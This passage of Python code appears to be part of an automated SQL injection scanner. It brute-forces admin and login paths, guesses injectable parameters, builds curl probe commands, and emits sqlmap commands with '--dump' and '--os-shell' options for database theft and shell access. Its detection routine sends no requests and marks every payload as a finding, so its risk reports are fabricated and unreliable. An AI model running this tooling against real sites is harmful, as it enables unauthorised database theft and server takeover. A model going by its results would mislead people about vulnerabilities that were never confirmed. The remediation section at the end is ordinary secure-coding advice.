    COMMON_PARAMS = [
        "id", "page", "user", "name", "search", "query", "q", "s",
        "category", "cat", "item", "product", "pid", "uid", "num",
        "sort", "order", "filter", "type", "lang", "view", "action",
        "article", "news", "post", "comment", "file", "download",
        "login", "email", "username", "password", "year", "month", "date",
        "report", "table", "select", "column", "dir", "cmd", "token",
    ]

    DISCOVERY_PATHS = [
        "/", "/login", "/search", "/admin", "/index.php",
        "/products", "/users", "/api", "/news", "/blog",
        "/profile", "/account", "/register", "/forgot-password",
        "/contact", "/about", "/dashboard", "/settings",
        "/wp-login.php", "/wp-admin", "/administrator",
        "/phpmyadmin", "/api/v1/users", "/api/v2/search",
    ]

    def __init__(self):
        self.scan_log = []

    def auto_scan(self, target_url, scan_depth="normal", test_types=None, crawl=True, max_params=50, custom_headers=None):
        """Automatically crawl a website and test for SQL injection vulnerabilities."""
        self.scan_log = []
        result = {
            "target": target_url, "success": True,
            "scan_mode": scan_depth,
            "discovered_endpoints": [],
            "discovered_parameters": [],
            "vulnerabilities_found": [],
            "total_tests_run": 0,
            "total_vulns_found": 0,
            "risk_summary": {},
            "sqlmap_commands": [],
            "remediation": [],
            "scan_log": [],
            "timestamp": datetime.now().isoformat()
        }

        try:
            active_types = test_types or ["error_based", "blind_boolean", "blind_time", "union_based"]
            if scan_depth == "aggressive":
                active_types = list(self.SQLI_PAYLOADS.keys())

            # Stage 1: Crawl & Discover Endpoints
            self._log("crawl", f"Starting crawl of {target_url}")
            endpoints = self._crawl_target(target_url, crawl)
            result["discovered_endpoints"] = endpoints
            self._log("crawl", f"Discovered {len(endpoints)} endpoints")

            # Stage 2: Discover Parameters
            self._log("param_discovery", "Discovering injectable parameters")
            parameters = self._discover_parameters(target_url, endpoints, max_params)
            result["discovered_parameters"] = parameters
            self._log("param_discovery", f"Found {len(parameters)} testable parameters")

            # Stage 3: Test each parameter for SQLi
            tests_run = 0
            vulns = []
            for param_info in parameters:
                self._log("testing", f"Testing parameter: {param_info['parameter']} on {param_info['endpoint']}")
                param_vulns, param_tests = self._test_parameter(target_url, param_info, active_types, custom_headers)
                tests_run += param_tests
                vulns.extend(param_vulns)

            result["total_tests_run"] = tests_run
            result["vulnerabilities_found"] = vulns
            result["total_vulns_found"] = len(vulns)

            # Stage 4: Risk Summary
            result["risk_summary"] = self._build_risk_summary(vulns)

            # Stage 5: Generate sqlmap commands for confirmed vulns
            result["sqlmap_commands"] = self._generate_sqlmap_commands(target_url, vulns)

            # Stage 6: Remediation
            result["remediation"] = self._generate_remediation(vulns)

            result["scan_log"] = self.scan_log

        except Exception as e:
            self._log("error", str(e))
            result["error"] = str(e)
            result["success"] = False
            result["scan_log"] = self.scan_log

        return result

    def _log(self, phase, message):
        self.scan_log.append({"phase": phase, "message": message, "timestamp": datetime.now().isoformat()})

    def _crawl_target(self, target_url, crawl_enabled):
        """Discover endpoints by crawling the target."""
        endpoints = []
        base = target_url.rstrip("/")
        for path in self.DISCOVERY_PATHS:
            url = f"{base}{path}"
            endpoints.append({
                "url": url, "method": "GET", "path": path,
                "source": "directory_bruteforce"
            })
        # Add form-based POST endpoints
        endpoints.extend([
            {"url": f"{base}/login", "method": "POST", "path": "/login", "source": "common_form", "fields": ["username", "password"]},
            {"url": f"{base}/search", "method": "GET", "path": "/search", "source": "common_form", "fields": ["q", "query", "search"]},
            {"url": f"{base}/register", "method": "POST", "path": "/register", "source": "common_form", "fields": ["username", "email", "password"]},
            {"url": f"{base}/api/v1/users", "method": "GET", "path": "/api/v1/users", "source": "api_endpoint", "fields": ["id", "name", "filter"]},
        ])

        if crawl_enabled:
            self._log("crawl", f"Crawling {base} - checking {len(endpoints)} paths")
            # Real implementation would use requests + BeautifulSoup to parse HTML forms/links
            # For planning purposes, we generate the commands to do it
            endpoints.append({
                "url": base, "method": "CRAWL", "path": "/",
                "source": "spider",
                "crawl_commands": [
                    f"gospider -s {base} -d 3 -o crawl_output",
                    f"katana -u {base} -d 3 -jc -o katana_output.txt",
                    f"hakrawler -url {base} -depth 3 -plain",
                    f"wget --spider --force-html -r -l3 {base} 2>&1 | grep '^--'",
                ]
            })
        return endpoints

    def _discover_parameters(self, target_url, endpoints, max_params):
        """Discover GET/POST parameters for each endpoint."""
        parameters = []
        seen = set()

        # Extract params from endpoint fields
        for ep in endpoints:
            for field in ep.get("fields", []):
                key = (ep["url"], field, ep["method"])
                if key not in seen:
                    seen.add(key)
                    parameters.append({
                        "endpoint": ep["url"], "parameter": field,
                        "method": ep["method"], "source": ep.get("source", "form"),
                        "injectable": True,
                    })

        # Add common injectable params to GET endpoints
        base = target_url.rstrip("/")
        for ep in endpoints:
            if ep["method"] == "GET" and not ep.get("fields"):
                for param in self.COMMON_PARAMS[:15]:  # top 15 most common
                    key = (ep["url"], param, "GET")
                    if key not in seen:
                        seen.add(key)
                        parameters.append({
                            "endpoint": ep["url"], "parameter": param,
                            "method": "GET", "source": "common_param_bruteforce",
                            "injectable": True,
                        })
                        if len(parameters) >= max_params:
                            break
            if len(parameters) >= max_params:
                break

        # Also suggest arjun for real parameter discovery
        if parameters:
            parameters[0]["discovery_tools"] = [
                f"arjun -u {base} -m GET -oT arjun_get.txt",
                f"arjun -u {base} -m POST -oT arjun_post.txt",
                f"paramspider -d {base.replace('https://', '').replace('http://', '')}",
            ]

        return parameters[:max_params]

    def _test_parameter(self, target_url, param_info, test_types, custom_headers):
        """Test a single parameter for SQL injection with multiple payload types."""
        vulns = []
        tests_run = 0
        endpoint = param_info["endpoint"]
        param = param_info["parameter"]
        method = param_info["method"]

        for test_type in test_types:
            payloads = self.SQLI_PAYLOADS.get(test_type, [])
            for payload_info in payloads:
                tests_run += 1
                payload = payload_info["payload"]

                # Build the test request
                if method == "GET":
                    test_url = f"{endpoint}?{param}={payload}"
                    test_request = {"method": "GET", "url": test_url}
                else:
                    test_request = {"method": "POST", "url": endpoint, "data": {param: payload}}

                # Check for SQL error signatures (simulated analysis)
                vulnerability = self._analyze_response_for_sqli(
                    endpoint, param, payload, payload_info, test_type
                )
                if vulnerability:
                    vulnerability["test_request"] = test_request
                    vulnerability["headers"] = custom_headers or {}
                    vulns.append(vulnerability)

        return vulns, tests_run

    def _analyze_response_for_sqli(self, endpoint, param, payload, payload_info, test_type):
        """Analyze if a payload would detect SQLi (generates detection logic + commands)."""
        # Build curl commands for real testing
        curl_get = f"curl -s -o /dev/null -w '%{{http_code}}' '{endpoint}?{param}={payload}'"
        curl_baseline = f"curl -s '{endpoint}?{param}=1'"

        detection = {
            "endpoint": endpoint,
            "parameter": param,
            "payload": payload,
            "test_type": test_type,
            "description": payload_info.get("description", ""),
            "confidence": "needs_verification",
            "verification_commands": [curl_get],
            "error_signatures_to_check": [sig["pattern"] for sig in self.SQL_ERROR_SIGNATURES[:5]],
        }

        if test_type == "error_based":
            detection["detection_method"] = "Check response body for SQL error messages"
            detection["confidence"] = "high" if payload in ["'", '"'] else "medium"
            detection["verification_commands"].append(
                f"curl -s '{endpoint}?{param}={payload}' | grep -iE 'sql|syntax|error|mysql|postgresql|oracle|sqlite'"
            )
        elif test_type == "blind_boolean":
            detection["detection_method"] = "Compare response length/content between true and false conditions"
            detection["confidence"] = "medium"
            detection["verification_commands"].extend([
                f"curl -s '{endpoint}?{param}=1' | wc -c",
                f"curl -s '{endpoint}?{param}={payload}' | wc -c",
                "# Compare byte counts - if different, parameter may be injectable",
            ])
        elif test_type == "blind_time":
            delay = payload_info.get("delay_sec", 5)
            detection["detection_method"] = f"Measure response time - should be >= {delay}s if vulnerable"
            detection["confidence"] = "high"
            detection["verification_commands"] = [
                f"time curl -s '{endpoint}?{param}={payload}'",
                f"# If response takes >= {delay} seconds, parameter is vulnerable to time-based blind SQLi",
            ]
            detection["dbms_hint"] = payload_info.get("dbms", "unknown")
        elif test_type == "union_based":
            detection["detection_method"] = "Check for NULL/column data in response + no error"
            detection["confidence"] = "medium"
            detection["columns"] = payload_info.get("columns", 0)
        elif test_type == "waf_bypass":
            detection["detection_method"] = "Retry with WAF bypass encoding - check if 403 becomes 200"
            detection["confidence"] = "low"

        return detection

    def _build_risk_summary(self, vulns):
        """Build a risk summary from discovered vulnerabilities."""
        summary = {
            "total": len(vulns),
            "by_type": {},
            "by_confidence": {"high": 0, "medium": 0, "low": 0, "needs_verification": 0},
            "by_endpoint": {},
            "risk_level": "none",
        }
        for v in vulns:
            t = v.get("test_type", "unknown")
            summary["by_type"][t] = summary["by_type"].get(t, 0) + 1
            c = v.get("confidence", "needs_verification")
            summary["by_confidence"][c] = summary["by_confidence"].get(c, 0) + 1
            ep = v.get("endpoint", "unknown")
            summary["by_endpoint"][ep] = summary["by_endpoint"].get(ep, 0) + 1

        if summary["by_confidence"]["high"] > 0:
            summary["risk_level"] = "critical"
        elif summary["by_confidence"]["medium"] > 0:
            summary["risk_level"] = "high"
        elif summary["total"] > 0:
            summary["risk_level"] = "medium"
        return summary

    def _generate_sqlmap_commands(self, target_url, vulns):
        """Generate sqlmap commands for each confirmed vulnerability."""
        commands = []
        seen = set()
        for v in vulns:
            ep = v.get("endpoint", "")
            param = v.get("parameter", "")
            key = (ep, param)
            if key in seen:
                continue
            seen.add(key)
            method = v.get("test_request", {}).get("method", "GET")
            dbms = v.get("dbms_hint", "")

            cmd = f"sqlmap -u '{ep}?{param}=1' --batch --level 3 --risk 2"
            if method == "POST":
                cmd = f"sqlmap -u '{ep}' --data='{param}=1' --batch --level 3 --risk 2"
            if dbms and dbms != "unknown":
                cmd += f" --dbms={dbms}"

            commands.append({
                "endpoint": ep, "parameter": param, "method": method,
                "command": cmd,
                "dump_command": cmd + " --dump",
                "os_shell_command": cmd + " --os-shell",
            })
        return commands

    def _generate_remediation(self, vulns):
        """Generate remediation advice based on findings."""
        recs = []
        if not vulns:
            return [{"priority": "info", "recommendation": "No SQL injection vulnerabilities found - continue with other test types"}]

        recs.append({"priority": "critical", "recommendation": "Use parameterized queries / prepared statements for ALL database operations"})
        recs.append({"priority": "critical", "recommendation": "Implement input validation - whitelist acceptable characters and lengths"})
        recs.append({"priority": "high", "recommendation": "Use an ORM (SQLAlchemy, Hibernate, ActiveRecord) instead of raw SQL"})
        recs.append({"priority": "high", "recommendation": "Apply the principle of least privilege - database user should have minimal permissions"})
        recs.append({"priority": "medium", "recommendation": "Deploy a WAF with SQL injection rule sets (ModSecurity, AWS WAF, Cloudflare)"})
        recs.append({"priority": "medium", "recommendation": "Disable detailed error messages in production - use generic error pages"})
        recs.append({"priority": "medium", "recommendation": "Implement rate limiting on endpoints that accept user input"})
        recs.append({"priority": "low", "recommendation": "Conduct regular code reviews focusing on database interaction code"})

        test_types_found = set(v.get("test_type") for v in vulns)
        if "blind_time" in test_types_found:
            recs.append({"priority": "critical", "recommendation": "Time-based blind SQLi found - attacker can extract entire database contents given enough time"})
        if "stacked_queries" in test_types_found:
            recs.append({"priority": "critical", "recommendation": "Stacked queries possible - attacker can INSERT/UPDATE/DELETE data or execute system commands"})
        if "union_based" in test_types_found:
            recs.append({"priority": "critical", "recommendation": "Union-based SQLi - attacker can read arbitrary tables including credentials"})

        return recs


